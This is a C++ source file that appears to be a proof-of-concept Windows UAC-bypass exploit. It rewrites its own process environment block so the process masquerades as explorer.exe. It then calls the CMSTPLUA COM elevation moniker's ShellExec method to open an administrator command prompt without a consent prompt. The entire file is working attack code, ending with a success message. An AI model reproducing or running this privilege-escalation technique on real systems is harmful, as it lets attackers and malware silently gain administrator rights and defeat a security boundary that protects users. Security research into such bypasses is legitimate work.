// $g++ masqueradePEB.cpp -lole32 -loleaut32 && a
// author: aaaddress1@chroot.org
#include <iostream>
#include <Shobjidl.h>
#include <winternl.h>
#include <windows.h>

using namespace std;
typedef interface ICMLuaUtil ICMLuaUtil;
typedef struct ICMLuaUtilVtbl
{

	BEGIN_INTERFACE

	HRESULT(STDMETHODCALLTYPE *QueryInterface)
	(
		__RPC__in ICMLuaUtil *This,
		__RPC__in REFIID riid,
		_COM_Outptr_ void **ppvObject);

	ULONG(STDMETHODCALLTYPE *AddRef)
	(
		__RPC__in ICMLuaUtil *This);

	ULONG(STDMETHODCALLTYPE *Release)
	(
		__RPC__in ICMLuaUtil *This);

	HRESULT(STDMETHODCALLTYPE *Method1)
	(
		__RPC__in ICMLuaUtil *This);

	HRESULT(STDMETHODCALLTYPE *Method2)
	(
		__RPC__in ICMLuaUtil *This);

	HRESULT(STDMETHODCALLTYPE *Method3)
	(
		__RPC__in ICMLuaUtil *This);

	HRESULT(STDMETHODCALLTYPE *Method4)
	(
		__RPC__in ICMLuaUtil *This);

	HRESULT(STDMETHODCALLTYPE *Method5)
	(
		__RPC__in ICMLuaUtil *This);

	HRESULT(STDMETHODCALLTYPE *Method6)
	(
		__RPC__in ICMLuaUtil *This);

	HRESULT(STDMETHODCALLTYPE *ShellExec)
	(
		__RPC__in ICMLuaUtil *This,
		_In_ const wchar_t *lpFile,
		_In_opt_ const wchar_t *lpParameters,
		_In_opt_ const wchar_t *lpDirectory,
		_In_ ULONG fMask,
		_In_ ULONG nShow);

	HRESULT(STDMETHODCALLTYPE *SetRegistryStringValue)
	(
		__RPC__in ICMLuaUtil *This,
		_In_ HKEY hKey,
		_In_opt_ LPCTSTR lpSubKey,
		_In_opt_ LPCTSTR lpValueName,
		_In_ LPCTSTR lpValueString);

	HRESULT(STDMETHODCALLTYPE *Method9)
	(
		__RPC__in ICMLuaUtil *This);

	HRESULT(STDMETHODCALLTYPE *Method10)
	(
		__RPC__in ICMLuaUtil *This);

	HRESULT(STDMETHODCALLTYPE *Method11)
	(
		__RPC__in ICMLuaUtil *This);

	HRESULT(STDMETHODCALLTYPE *Method12)
	(
		__RPC__in ICMLuaUtil *This);

	HRESULT(STDMETHODCALLTYPE *Method13)
	(
		__RPC__in ICMLuaUtil *This);

	HRESULT(STDMETHODCALLTYPE *Method14)
	(
		__RPC__in ICMLuaUtil *This);

	HRESULT(STDMETHODCALLTYPE *Method15)
	(
		__RPC__in ICMLuaUtil *This);

	HRESULT(STDMETHODCALLTYPE *Method16)
	(
		__RPC__in ICMLuaUtil *This);

	HRESULT(STDMETHODCALLTYPE *Method17)
	(
		__RPC__in ICMLuaUtil *This);

	HRESULT(STDMETHODCALLTYPE *Method18)
	(
		__RPC__in ICMLuaUtil *This);

	HRESULT(STDMETHODCALLTYPE *Method19)
	(
		__RPC__in ICMLuaUtil *This);

	HRESULT(STDMETHODCALLTYPE *Method20)
	(
		__RPC__in ICMLuaUtil *This);

	END_INTERFACE

} * PICMLuaUtilVtbl;
interface ICMLuaUtil { CONST_VTBL struct ICMLuaUtilVtbl *lpVtbl; };
HRESULT fn_call_CMSTPLUA_shellexecute()
{
	HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
	ICMLuaUtil *CMLuaUtil = NULL;
	IID xIID_ICMLuaUtil;
	LPCWSTR lpIID = L"{6EDD6D74-C007-4E75-B76A-E5740995E24C}";
	IIDFromString(lpIID, &xIID_ICMLuaUtil);
	BIND_OPTS3 bop;

	ZeroMemory(&bop, sizeof(bop));
	if (!SUCCEEDED(hr))
		return hr;

	bop.cbStruct = sizeof(bop);
	bop.dwClassContext = CLSCTX_LOCAL_SERVER;
	hr = CoGetObject(L"Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}", (BIND_OPTS *)&bop, xIID_ICMLuaUtil, (VOID **)&CMLuaUtil);
	if (hr != S_OK)
		return hr;

	hr = CMLuaUtil->lpVtbl->ShellExec(CMLuaUtil, L"cmd.exe", L"/k \"echo exploit done.", NULL, SEE_MASK_DEFAULT, SW_SHOW);
	if (CMLuaUtil != NULL)
		CMLuaUtil->lpVtbl->Release(CMLuaUtil);
	return hr;
}

typedef struct _UNICODE_STRING32
{
	USHORT Length;
	USHORT MaximumLength;
	PWSTR Buffer;
} UNICODE_STRING32, *PUNICODE_STRING32;

struct mPEB32
{
	UCHAR InheritedAddressSpace;
	UCHAR ReadImageFileExecOptions;
	UCHAR BeingDebugged;
	UCHAR BitField;
	ULONG Mutant;
	ULONG ImageBaseAddress;
	PEB_LDR_DATA *Ldr;
	PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
	ULONG SubSystemData;
	ULONG ProcessHeap;
	ULONG FastPebLock;
	ULONG AtlThunkSListPtr;
	ULONG IFEOKey;
	ULONG CrossProcessFlags;
	ULONG UserSharedInfoPtr;
	ULONG SystemReserved;
	ULONG AtlThunkSListPtr32;
	ULONG ApiSetMap;
};

typedef struct _LDR_DATA_TABLE_ENTRY32
{
	LIST_ENTRY32 InLoadOrderLinks;
	LIST_ENTRY32 InMemoryOrderModuleList;
	LIST_ENTRY32 InInitializationOrderModuleList;
	ULONG DllBase;
	ULONG EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING32 FullDllName;
	UNICODE_STRING32 BaseDllName;
	ULONG Flags;
	USHORT LoadCount;
	USHORT TlsIndex;
	union
	{
		LIST_ENTRY32 HashLinks;
		ULONG SectionPointer;
	};
	ULONG CheckSum;
	union
	{
		ULONG TimeDateStamp;
		ULONG LoadedImports;
	};
	ULONG EntryPointActivationContext;
	ULONG PatchInformation;
} LDR_DATA_TABLE_ENTRY32, *PLDR_DATA_TABLE_ENTRY32;

int main()
{
	void(WINAPI * pfnRtlInitUnicodeString)(PUNICODE_STRING DestinationString, PCWSTR SourceString) =
		(void(WINAPI *)(PUNICODE_STRING, PCWSTR))GetProcAddress(LoadLibrary("ntdll.dll"), "RtlInitUnicodeString");

	WCHAR lpExplorePath[MAX_PATH];
	ExpandEnvironmentStringsW(L"%SYSTEMROOT%\\explorer.exe", lpExplorePath, sizeof(lpExplorePath));

	mPEB32 *pPEB = (mPEB32 *)__readfsdword(0x30);
	PLIST_ENTRY header = &(pPEB->Ldr->InMemoryOrderModuleList);
	LDR_DATA_TABLE_ENTRY32 *data = CONTAINING_RECORD(header->Flink, LDR_DATA_TABLE_ENTRY32, InMemoryOrderModuleList);

	// patch current image path + arguments
	pfnRtlInitUnicodeString(&pPEB->ProcessParameters->ImagePathName, lpExplorePath);
	pfnRtlInitUnicodeString(&pPEB->ProcessParameters->CommandLine, lpExplorePath);
	// patch loaded module name in PEB->LDR
	pfnRtlInitUnicodeString((PUNICODE_STRING)&data->FullDllName, lpExplorePath);
	pfnRtlInitUnicodeString((PUNICODE_STRING)&data->BaseDllName, L"explorer.exe");

	if (SUCCEEDED(fn_call_CMSTPLUA_shellexecute()))
		cout << "[!] successful" << endl;
	return 0;
}
